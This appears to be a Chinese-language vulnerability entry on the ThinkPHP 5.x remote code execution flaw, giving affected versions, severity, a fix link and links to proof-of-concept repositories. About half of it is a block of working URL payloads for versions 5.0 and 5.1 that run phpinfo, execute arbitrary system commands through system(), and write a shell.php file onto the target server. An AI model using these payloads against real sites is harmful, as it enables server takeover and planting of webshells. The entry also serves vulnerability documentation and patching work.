1. `漏洞`：ThinkPHP远程代码执行
2. `等级`：高危
3. `影响范围`：5.x < 5.1.31, <= 5.0.23
4. `漏洞描述`：框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞。
5. `修复方案`：<https://blog.thinkphp.cn/869075>
6. `PoC`：<https://github.com/heroanswer/thinkphp_rce_poc.git>
7. `payload`: 

```php
5.0版本POC（不唯一）:
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
命令执行：?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=[系统命令]
文件写入：?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][1]=<?php phpinfo();?>

5.1版本POC（不唯一）
?s=index/\think\Request/input&filter=phpinfo&data=1
命令执行：?s=index/\think\Request/input&filter=system&data=[系统命令]
文件写入：?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
```

## 漏洞复现代码

```
https://github.com/fakeblog/TH5.0_GETSHELL.git
```

## 漏洞分析：

知道创宇404实验室:[Thinkphp5 远程代码执行漏洞事件分析报告](https://paper.seebug.org/770/)